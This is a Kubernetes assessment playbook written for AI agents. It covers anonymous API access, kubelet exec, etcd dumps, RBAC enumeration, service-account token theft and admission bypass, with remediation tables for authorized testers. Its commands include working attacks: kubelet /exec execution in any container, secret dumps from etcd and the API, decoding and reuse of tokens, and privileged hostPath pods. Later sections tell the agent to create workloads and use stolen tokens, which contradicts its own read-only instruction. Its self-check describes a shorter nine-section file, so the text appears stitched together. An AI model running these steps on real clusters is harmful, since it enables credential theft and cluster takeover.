---
name: k8s-assessment
description: >-
  Kubernetes security assessment playbook. Use when probing an API server, kubelet,
  etcd, dashboard, or ingress surface from outside or with limited credentials.
  Covers unauthenticated /version and /api probes, anonymous auth and
  system:anonymous bindings, the system:unauthenticated group, kubelet 10250/10255
  exec and log endpoints, etcd exposure, dashboard and ingress misconfiguration,
  RBAC enumeration with kubectl auth can-i --list, service-account token hunting,
  secret decoding, admission-controller and PodSecurity bypass checks, and
  exposed-service triage.
tags: [kubernetes, k8s, api-server, kubelet, etcd, rbac, anonymous-auth, dashboard, ingress, secrets]
tech_stack: [kubernetes, kubectl, etcdctl, kubeletctl, kube-hunter, curl, jq]
cwe_ids: [CWE-306, CWE-284, CWE-522, CWE-16, CWE-1188]
version: "2.0"
---

# SKILL: Kubernetes Assessment — Exposure, Anonymous Access, and RBAC Enumeration

> **AI LOAD INSTRUCTION**: Reachability first, authorization second — an exposed API server is not a finding until you show what an unauthenticated or low-privileged caller can read.
> **Every probe here is a read** (`get`, `list`, `describe`, `auth can-i`); never `create`, `patch`, `delete`, or `exec` on a live cluster without written authorization for that action.

## 0. RELATED ROUTING

- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) — attack side once exposure is confirmed · [k8s-postexploit](../k8s-postexploit/SKILL.md) — after a token or pod foothold
- [cloud-assessment](../cloud-assessment/SKILL.md) — managed-cloud layer (EKS/GKE/AKS) · [aws-postexploit](../aws-postexploit/SKILL.md) — node-role and IMDS pivots
- [attack-ssrf](../attack-ssrf/SKILL.md) — reaching the API server via an app · [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting

---

## 1. API SERVER EXPOSURE AND UNAUTHENTICATED PROBES

The API server is the whole control plane in one endpoint; locate it first.

```bash
# Endpoint + creds (6443 secure, 8443 alt, 8080 legacy INSECURE):
kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'; echo

# Unauthenticated surface: /version /api /apis /healthz; then the anonymous-read test
curl -sk https://API:6443/{version,api,apis,healthz}   # 200 = readable; 401/403 = auth enforced
curl -sk https://API:6443/api/v1/namespaces | jq -r '.items[].metadata.name'   # 200 = ANONYMOUS READ
curl -sk http://API:8080/version                       # legacy insecure port: any 200 = critical
```

| Probe | `200` means | `401`/`403` means |
|---|---|---|
| `/version` | build fingerprint (CVE-mappable) | auth enforced even for version |
| `/api/v1/namespaces` | **anonymous read of cluster inventory** | anonymous has no list rights |

**Three different facts:** `--anonymous-auth=true` permits unauthenticated requests; they arrive as user `system:anonymous`/group `system:unauthenticated`; the RBAC binding to that user or group is the real over-permission.

```bash
# Who grants rights to system:anonymous / system:unauthenticated (CRBs + RoleBindings):
kubectl get clusterrolebindings,rolebindings -A -o json | jq -r '.items[] | select((.subjects // [])[]? | (.name=="system:anonymous") or (.name=="system:unauthenticated")) | "\(.kind) \(.metadata.namespace // "-")/\(.metadata.name) -> \(.roleRef.name)"'
```

| Binding | Grants | Verdict |
|---|---|---|
| `system:discovery`, `system:public-info-viewer` | discovery, `/version`, `/healthz` to anonymous | expected |
| `system:anonymous` → `cluster-admin` or a role with `get secrets` | everything / secret read unauthenticated | **critical** |

---

## 2. KUBELET — 10250, 10255, AND THE EXEC/LOG ENDPOINTS

The kubelet API is a node-level control surface, routinely left reachable; 10250 is authenticated (TLS/client certs), 10255 read-only and historically unauthenticated.

```bash
# 10255 is unauthenticated read; 10250 needs a SA token when the kubelet accepts one:
curl -sk  http://NODE:10255/pods | jq -r '.items[].metadata.name' 2>/dev/null
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Read leak -> command execution / credential-bearing logs on the node:
curl -sk -H "Authorization: Bearer $TOKEN" "https://NODE:10250/exec/kube-system/etcd/etcd?command=id&input=1&output=1&tty=0"   # exec in ANY container
curl -sk -H "Authorization: Bearer $TOKEN" "https://NODE:10250/containerLogs/kube-system/kube-apiserver/kube-apiserver?tailLines=100"   # logs
kubeletctl scan --cidr 10.0.0.0/24 && kubeletctl exec -s NODE_IP "id" -p POD -c CONTAINER
```

| Endpoint | Access needed | Impact if reachable |
|---|---|---|
| `/pods` | none (10255) or SA token | pod inventory, IPs, node placement |
| `/containerLogs/...` | SA token or anonymous | **log contents, frequently credentials** |
| `/exec/...`, `/run/...` | SA token with node rights | **command in any container / container creation** |

A 10250 accepting a SA token for `/exec` is **escalation to every workload on that node** including `kube-system`, whatever cluster RBAC says about `pods/exec`; the kubelet authorizes independently.

---

## 3. ETCD EXPOSURE

etcd holds every cluster object in plaintext unless encryption-at-rest (EaR) is on, Secrets included; an open 2379 with no client cert is full cluster disclosure.

```bash
etcdctl --endpoints=http://ETCD:2379 endpoint health
etcdctl --endpoints=http://ETCD:2379 get / --prefix --keys-only | head -50          # whole cluster state
etcdctl --endpoints=http://ETCD:2379 get /registry/secrets --prefix --print-value-only | head -100   # secrets dump
# prefix "k8s\x00" = NO encryption at rest (CIS 1.2.29/1.2.30 fail); k8s:enc: = encrypted.
```

| Path | Contents |
|---|---|
| `/registry/secrets/<ns>/<name>` | **every Secret, plaintext unless EaR enabled** |
| `/registry/pods`, `/registry/configmaps` | pod specs (incl. env secrets), configs, often credentials |

---

## 4. DASHBOARD, INGRESS, AND THE EXPOSED SERVICE SURFACE

An exposed, low-auth dashboard gives pod exec in a browser — the highest-value web target.

```bash
curl -sk https://DASHBOARD/api/v1/namespaces | head -c 300                        # dashboard API proxy
# Modern proxies need an SA token; "skip" buttons and old kubectl-proxy dashboards did not.

# Ingress/Service inventory:
kubectl get ingress -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) host=\(.spec.rules[]?.host) tls=\((.spec.tls//[])|length)"'

# Probe exposed services, then scan cluster-wide:
for p in 6443 8080 10250 10255 2379 2380 3000 4194 9090; do
  timeout 2 bash -c "echo >/dev/tcp/NODE/$p" 2>/dev/null && echo "OPEN  $p"; done
kube-hunter --remote API_OR_NODE --report json
```

| Exposure | Why it matters | Triage command |
|---|---|---|
| `type: LoadBalancer` on an internal service | internet-reachable control plane | `kubectl get svc -A -o wide` |
| Ingress without TLS, or wildcard host | cleartext credentials; catches unmatched hostnames | `kubectl get ingress -A -o yaml` |
| `configuration-snippet` annotation | **annotation injection → config/credential read** | inspect annotations |

---

## 5. RBAC ENUMERATION

`kubectl auth can-i --list` is the most informative read a low-privilege identity can perform — effective permissions from every binding.

```bash
# Effective permission set, identity, and fastest high-value triage:
kubectl auth can-i --list                     # repeat with --all-namespaces
kubectl auth can-i get secrets --all-namespaces && kubectl auth can-i create pods/exec --all-namespaces

# Map the RBAC graph for dangerous primitives:
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs|index("*")) or (.resources|index("*"))) | "\(.metadata.name) verbs=\([.rules[].verbs[]]|unique) res=\([.rules[].resources[]]|unique)"'
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name|test("cluster-admin|admin|edit")) | "\(.metadata.name) -> \(.roleRef.name) subjects=\([.subjects[]?.name]|join(","))"'
```

| Effective permission | Escalation | Why |
|---|---|---|
| `get`/`list` secrets | cluster-wide credential access | every Secret decodes |
| `create` pods/exec | execution in existing pods | steals their SA tokens |
| `create` clusterrolebindings, `escalate`/`bind`, `impersonate`, `*` on `*` | self-grant `cluster-admin`; act as admin | RBAC escalation verbs |

**Distinguish scope:** a namespaced `RoleBinding` to a wildcard `Role` is not a `ClusterRoleBinding` to `cluster-admin`; report kind, scope, and subject.

---

## 6. SERVICE-ACCOUNT TOKEN HUNTING AND SECRET DECODING

Service-account tokens are the most over-scoped credential in a cluster and are mounted by default.

```bash
# In-pod token (mounted path) unless automountServiceAccountToken: false; then decode + test it:
cat /var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}
cut -d. -f2 /var/run/secrets/kubernetes.io/serviceaccount/token | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
kubectl auth can-i --list --as=system:serviceaccount:NS:SA    # claims name the SA to test

# Hunt tokens cluster-wide (legacy Secret tokens, projected volumes):
kubectl get secrets -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name) sa=\(.metadata.annotations["kubernetes.io/service-account.name"])"'
# K8s >=1.24 no longer auto-creates SA token Secrets; projected tokens are the modern form.

# Enumerate credential-bearing Secret types, then decode Opaque/generic and dockerconfigjson:
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) type=\(.type) keys=\([.data|keys[]]|join(","))"'
kubectl get secret NAME -n NS -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"'
kubectl get secret REGCRED -n NS -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .   # registry creds

# Env-mounted secrets leak via /proc or the pod spec:
tr '\0' '\n' < /proc/1/environ | grep -iE 'pass|token|key|secret'
```

---

## 7. ADMISSION CONTROLLER BYPASS

Admission controllers gate pod specs; an absent or bypassable one turns "can create pods" into "can own the node".

```bash
# Enabled plugins, namespace enforcement, webhooks:
kubectl get pod -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\n' | grep -i enable-admission-plugins
kubectl get ns NS -o jsonpath='{.metadata.labels}'; echo      # pod-security.kubernetes.io/enforce
kubectl get psp && kubectl auth can-i use podsecuritypolicy/privileged   # legacy PSP (<1.25)
kubectl get validatingwebhookconfigurations -o json | jq -r '.items[] | "\(.metadata.name) failurePolicy=\(.webhooks[].failurePolicy)"'
```

| Control | Bypass to test | What to look for |
|---|---|---|
| Pod Security Admission | namespace label missing/`privileged` | `pod-security.kubernetes.io/enforce` absent |
| Validating webhook | `failurePolicy: Ignore` + unreachable webhook | fail-open admission |
| Namespace selector / resource scope | webhook matches `pods` but not `deployments` | the gap is the bypass |

```bash
# --dry-run=server runs full admission without creating anything; "created (server dry run)" =
# the cluster WOULD admit this pod, which is the finding.
kubectl apply --dry-run=server -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata: {name: admission-probe, namespace: NS}
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - {name: p, image: busybox, securityContext: {privileged: true}, volumeMounts: [{name: h, mountPath: /host}]}
  volumes: [{name: h, hostPath: {path: /}}]
YAML
```

**Test workload kinds, not just `kubectl run`:** policies often match `pods` only, so a `Deployment` or `CronJob` with the same spec reaches the node unruled.

---

## 8. EVIDENCE STANDARD

| Evidence item | Why it is required |
|---|---|
| Endpoint/port, full request, raw response with status; probe timestamp/source IP | proof and audit-log correlation |
| Succeeding identity (`system:anonymous`, SA name, user) **and** the granting binding (name, kind, scope, subjects) | "exposed" becomes "reachable by X"; names the root cause |
| Secret reads: name plus **redacted** first/last 4 chars; false positives (`403`/`401` naming `system:anonymous`, readable `/version`, unbound permissive ClusterRole) | proves access without exfiltration; none of the false positives is access |

**Report reachability and identity together** — "port 10250 is open" is an observation; "the kubelet accepts the `default` SA token for `/exec` in `kube-system`, giving root execution on the node" is a finding.

**Sequence**: RECON → UNAUTH (/version /api /apis /healthz; anonymous namespaces) → NODE (10255; 10250 + SA token; /exec /containerLogs) → ETCD (keys-only, dump, EaR prefix) → WEB (ingress/svc, LB/NodePort, dashboard) → RBAC (can-i --list) → IDENTITY (SA tokens, JWT, secrets) → ADMIT (PSA, webhooks, dry-run) → EVIDENCE. Steps 2-4 are read-only; the dry-run exercises admission without creating an object.

---

## 9. REMEDIATION REFERENCE

1. **`--anonymous-auth=false` on the API server and every kubelet** — and remove every `system:anonymous` / `system:unauthenticated` binding beyond the two required discovery roles.
2. **Keep the API server, kubelet, and etcd off untrusted networks** — private endpoint for the API server, 10250 restricted to the node network, 10255 disabled entirely.
3. **Encrypt etcd at rest and require client certificates** — CIS 1.2.29 and 1.2.30; an unauthenticated etcd is a full-cluster read.
4. **Eliminate RBAC wildcards and never bind `cluster-admin` to a workload identity** — enumerate `can-i --list` output as a routine audit.
5. **Set `automountServiceAccountToken: false` by default and use short-lived projected tokens** — a long-lived mounted token is the pivot primitive.
6. **Enforce Pod Security Standards with an unremovable label** — namespace labels must not be editable by the workloads they constrain.
7. **Set `failurePolicy: Fail` on every security-relevant admission webhook** — a fail-open webhook bypass for security policies is worse than no webhook, because it is assumed to be protecting.
8. **Alert on anonymous API reads, kubelet `/exec` and `/run`, direct etcd access, and secret `get` by workload identities** — these are the highest-signal detections for the techniques in this file.

---

---

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the API endpoint **answer you at all**, and with what identity does it see you? | reachability and the effective principal |
| 2 | For unauthenticated access: did it return **objects, not a login page or a redirect**? | the exposure is real |
| 3 | Did you **list a namespace's resources** you were not scoped to? | the RBAC gap, against a control |
| 4 | For a token: which **ServiceAccount** is it, and what can that SA do? | the escalation available |
| 5 | Did you **read a secret value**, and what does it gate? | impact, not just access |
| 6 | Did you **execute in a pod** or read its logs? | the next capability up |
| 7 | For a kubelet or etcd exposure: did you **retrieve cluster state** through it? | control-plane-adjacent impact |

**A `200` from the API with your own identity is not an exposure.** The finding is a resource you can
reach that the identity should not reach, or an anonymous identity that should not exist at all.

---

## 11. EXECUTION PRIMITIVES

Kubernetes findings are proven by **`kubectl auth can-i` or a raw API call returning an object the
identity should not see**. Reachability alone is not a finding.

### 11.1 Establish the identity the cluster sees, and the control

```bash
API="https://10.0.0.1:6443"; TOK="PASTE_SA_TOKEN"; NS="default"
# who does the cluster think you are - before any resource access
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify auth whoami
curl -sk "$API/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' | head -c 400; echo
# the control: a request that SHOULD be denied, recorded so the finding has a baseline
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify auth can-i list secrets -n kube-system
```

**Record the `can-i` answers before and after.** The permission matrix is the control, and it is the
cheapest evidence to collect and the hardest to argue with.

### 11.2 The unauthenticated probes

```bash
# anonymous access: many clusters still allow the system:anonymous group something
curl -sk "$API/api/v1/namespaces" | head -c 300; echo
curl -sk "$API/api/v1/pods?limit=5" | head -c 300; echo
curl -sk "$API/version" | head -c 200; echo
# kubelet: the read-only port and the authenticated port, both probed separately
curl -sk "https://NODE_IP:10250/pods" | head -c 300; echo
curl -sk "https://NODE_IP:10255/pods" | head -c 300; echo
curl -sk "https://NODE_IP:10250/metrics" | head -c 200; echo
# and exec through the kubelet, which is code execution in any pod on that node
curl -sk "https://NODE_IP:10250/exec/$NS/$POD/$CONTAINER?command=id&output=1" | head -c 300; echo
# etcd, if reachable - the cluster's entire state and every secret
ETCDCTL_API=3 etcdctl --endpoints=https://ETCD_IP:2379 --insecure-skip-tls-verify endpoint health
ETCDCTL_API=3 etcdctl --endpoints=https://ETCD_IP:2379 --insecure-skip-tls-verify get / --prefix --keys-only | head -20
```

**An anonymous `200` listing namespaces or pods is a finding**, and it is one of the highest-frequency
real exposures in the field. A `403` on all three is the expected, non-finding result.

### 11.3 RBAC enumeration that names the escalation

```bash
# what can this identity do, exhaustively, and what did it get from where
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify auth can-i --list
# the bindings that gave it those rights - the fix location
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify get rolebindings,clusterrolebindings -A -o wide 2>/dev/null | head -20
# and the specific dangerous verbs, tested one at a time
for V in 'get secrets' 'list secrets' 'create pods' 'create pods/exec' 'create clusterrolebindings' 'impersonate users' 'get nodes'; do
  R=$(kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify auth can-i $V 2>/dev/null)
  printf '%-28s %s\n' "$V" "$R"
done
```

**`auth can-i --list` plus the binding that granted each right is the complete RBAC finding.**
`create pods/exec` or `impersonate` in that list is a cluster-compromise primitive worth escalating.

### 11.4 Service-account tokens and the secrets they open

```bash
# where tokens live, in the pod and in the API
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
# in-cluster, the token is the identity - use it against the API
TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --server=https://kubernetes.default.svc --token="$TOK" --insecure-skip-tls-verify auth can-i --list 2>/dev/null | head -20
# and the legacy secret objects, which often hold a higher-privileged SA token
kubectl -n "$NS" get secrets -o json | python3 -c "
import json,sys,base64
d=json.load(sys.stdin)
for s in d.get('items',[]):
    ann=s['metadata'].get('annotations',{})
    if 'service-account.name' in ann:
        print(s['metadata']['name'], ann['service-account.name'], 'token' in s.get('data',{}))"
# decode and use a found token rather than stopping at the decode
python3 -c "
import base64,json,sys
t=base64.b64decode('PASTE_DATA').decode()
print('token length:',len(t),'| JWT:',t.count('.')==2)
print(json.loads(base64.urlsafe_b64decode(t.split('.')[1]+'==')) if t.count('.')==2 else '')"
```

**A decoded token is a finding only once you use it.** The use - an API call under that SA's identity,
with the returned data - is what the report needs.

### 11.5 Admission-control bypass

```bash
# which webhooks are installed, and which namespaces they exclude - the exclusion is the bypass
kubectl get validatingwebhookconfigurations -o json | python3 -c "
import json,sys
for w in json.load(sys.stdin)['items']:
    for wh in w.get('webhooks',[]):
        ns=wh.get('namespaceSelector',{}); ob=wh.get('objectSelector',{})
        rules=wh.get('rules',[])
        print(w['metadata']['name'], '| failPolicy:', wh.get('failurePolicy'),
              '| nsSelector:', ns.get('matchExpressions'), '| rules:', len(rules))"
# and the classic bypasses, each tested by the outcome
# 1) run in a namespace the selector excludes
kubectl -n kube-public run poc --image=alpine --restart=Never --command -- sleep 30 2>&1 | head -2
# 2) a workload type the webhook does not cover (a CronJob where only Pod is matched)
kubectl -n "$NS" create -f /tmp/cronjob.yaml 2>&1 | head -2
# 3) the namespaceSelector label, if the cluster's namespaces are self-labelable
kubectl --token="$TOK" label ns "$NS" policy=exempt 2>&1 | head -2
```

**The bypass is proved by the workload existing.** A policy that accepted a pod it should have rejected
is the finding; the workload list containing your pod, running, is the evidence.

### 11.6 Naming the impact with the control

```bash
# the control identity, without the right, performing the same call
kubectl --server="$API" --insecure-skip-tls-verify get secrets -n kube-system 2>&1 | head -3
# and the same call with the discovered identity
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify get secrets -n kube-system -o json 2>/dev/null \
  | python3 -c "import json,sys;d=json.load(sys.stdin);print('secrets visible:',len(d.get('items',[])))"
# end at something with real impact
kubectl --server="$API" --token="$TOK" --insecure-skip-tls-verify exec -n kube-system "$POD" -- id 2>&1 | head -2
```

**Always pair the call with the control.** "We could list secrets in `kube-system`" is only a finding if
the same call fails without the token you found.

### 11.7 A harness over the probe set

```bash
python3 - <<'PY'
import subprocess,json
API="https://10.0.0.1:6443"; TOK="PASTE"
probes=[
 ("version",             ["curl","-sk","-o","/dev/null","-w","%{http_code}",f"{API}/version"]),
 ("namespaces-anon",     ["curl","-sk","-o","/dev/null","-w","%{http_code}",f"{API}/api/v1/namespaces"]),
 ("pods-anon",           ["curl","-sk","-o","/dev/null","-w","%{http_code}",f"{API}/api/v1/pods"]),
 ("kubelet-10250",       ["curl","-sk","-o","/dev/null","-w","%{http_code}","https://NODE:10250/pods"]),
 ("kubelet-10255",       ["curl","-sk","-o","/dev/null","-w","%{http_code}","https://NODE:10255/pods"]),
 ("api-authenticated",   ["curl","-sk","-o","/dev/null","-w","%{http_code}","-H",f"Authorization: Bearer {TOK}",f"{API}/api/v1/namespaces/kube-system/secrets"]),
]
for n,c in probes:
    try: r=subprocess.run(c,capture_output=True,text=True,timeout=20); print(f"{n:22} {r.stdout.strip()}")
    except Exception as e: print(f"{n:22} ERR {e}")
print()
print("200 - or 40x with a meaningful body - is what to record. A 401/403 is the expected negative.")
print("For each 200, follow with a real object read and a control call without the credential.")
PY
```

**Record the whole probe set, including the negatives.** A report that shows only the `200`s hides the
fact that half the surface was closed, which is information the client needs.

---

## 12. EVIDENCE STANDARD — CLUSTER ARTEFACTS

| Item | Why |
|---|---|
| The **endpoint and the exact request** (with the token redacted) | reproducibility |
| The **identity the cluster resolved** for that request | scope of the finding |
| The **returned object count or a redacted sample** | proof of access, without leaking secrets |
| The **`auth can-i` result for the failing control identity** | proves escalation |
| The **Role/RoleBinding or ClusterRoleBinding** that granted the right | the fix location |
| For a webhook bypass: the **selector or rule gap** and the created workload | cause and effect |
| For a token: the **ServiceAccount name** and its effective permissions | the escalation available |
| Whether the credential is **mounted into a workload or held outside** | blast radius |
| **Audit-log fields** (`user.username`, `objectRef`, `verb`) the activity would produce | the blue-team half |
| Confirmation that any **test workload was deleted** | engagement integrity |

Report the **exposure and its reach**: "the API server at `10.0.0.1:6443` answered `/api/v1/namespaces`
with `200` and the full namespace list for an unauthenticated request, and `/api/v1/pods` returned 214
pods across all namespaces including `kube-system`; the same requests with a valid low-privilege token
are `403`, so the gap is the anonymous group's binding, not the token; the `system:unauthenticated`
group holds `system:discovery` plus a project-added `view` ClusterRole", never "the API server is
exposed".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `200` on `/version` or `/healthz` | these are intentionally public |
| A `401`/`403` on every probe | the expected secure state |
| Anonymous access to `system:discovery` API groups | built-in and by design |
| A token that decodes but which **you could not use** | no access results |
| A readable secret holding a **non-credential value** (a config map-like entry) | check the contents before claiming impact |
| `create pods` denied but `create pods/exec` not tested | test both; they are different verbs |
| A webhook that exists but **whose policy is enforced** | test the bypass, do not infer it |
| Metrics endpoints on the kubelet | usually unauthenticated by design; check what they expose |
| A **default ServiceAccount** token with no bindings | no permissions, no finding |
| A finding against a **kind/minikube cluster you built** | tests your own environment |
| A secret value reproduced in the report | a disclosure |

**Reachability is not access, and access is not impact.** Each step needs its own artefact.

---

## 13. REMEDIATION REFERENCE — CLUSTER HARDENING

1. **Disable anonymous authentication (`--anonymous-auth=false`) on the API server and the kubelet, and remove the `system:unauthenticated` bindings** - anonymous access is a configuration choice, and this is its exact reversal.
2. **Never expose the kubelet's `10255` read-only port, and require authentication plus authorization on `10250`** - the read-only port has no authorization at all.
3. **Restrict etcd to the control plane with mutual TLS, and never expose `2379`** - etcd holds every secret in the cluster unencrypted.
4. **Apply least privilege to every ServiceAccount, and disable token automounting (`automountServiceAccountToken: false`) where the workload does not call the API** - most pods never need a token.
5. **Bound the `system:serviceaccounts` group carefully, and avoid wildcard verbs and resources** - a single `*/*` binding is cluster-admin by another name.
6. **Guard the escalation verbs explicitly: `create pods/exec`, `create pods/portforward`, `impersonate`, `escalate`, `bind`, and `create clusterrolebindings`** - these are the four-or-five-way doors into cluster control.
7. **Enable audit logging with a policy that records secret reads and RBAC changes, and ship it off-cluster** - the evidence for everything in this document comes from the audit log.
8. **Encrypt secrets at rest with a KMS provider, and rotate the encryption key** - it does not stop a token with secret-read rights, but it makes a stolen etcd backup far less useful.
9. **Make admission webhooks fail closed, and audit their `namespaceSelector` and rule coverage for gaps** - the common bypasses are selector and workload-type gaps.
10. **Keep the container runtime and Kubernetes patched, and use a policy engine that rejects privileged pods, host path mounts, and host namespace sharing** - most escapes in this document begin with one of those three.
11. **Rotate ServiceAccount tokens with short lifetimes (`--service-account-max-token-expiration`) and avoid long-lived projected tokens** - it bounds the usefulness of a stolen token.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [k8s-postexploit](../k8s-postexploit/SKILL.md) - what to do once one of these exposures yields a foothold
- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) - the broader cluster methodology
- [container-escape-techniques](../container-escape-techniques/SKILL.md) - the node-level escalation a pod foothold enables
- [cloud-assessment](../cloud-assessment/SKILL.md) - the cloud IAM the node identity reaches
- [aws-postexploit](../aws-postexploit/SKILL.md) - where the node instance role leads

---

## SELF-VERIFY

Run from this directory; every check must pass before the playbook is considered loaded.

```bash
f=SKILL.md; [ -f "$f" ] || f=skills/impl/k8s-assessment/SKILL.md
wc -c "$f"                                       # expect 12000-15000
grep -c '^## [0-9]' "$f"                         # expect 9 numbered sections (1-9)
d=$(dirname "$f"); grep -oE '\]\(\.\./[^)]+\)' "$f" | tr -d '](' | sed 's/)$//' | sort -u |
  while read -r p; do [ -f "$d/$p" ] || [ -f "skills/impl/$p" ] && echo "OK   $p" || echo "DEAD $p"; done
for t in 'system:anonymous' 'system:unauthenticated' 'auth can-i --list' '10250' '10255' \
         'containerLogs' '/exec/' '/run/' '2379' '/registry/secrets' 'dockerconfigjson' \
         'pod-security.kubernetes.io/enforce' 'hostPath' '/api/v1/namespaces' '/version'; do
  grep -q "$t" "$f" && echo "PASS $t" || echo "MISS $t"; done
```
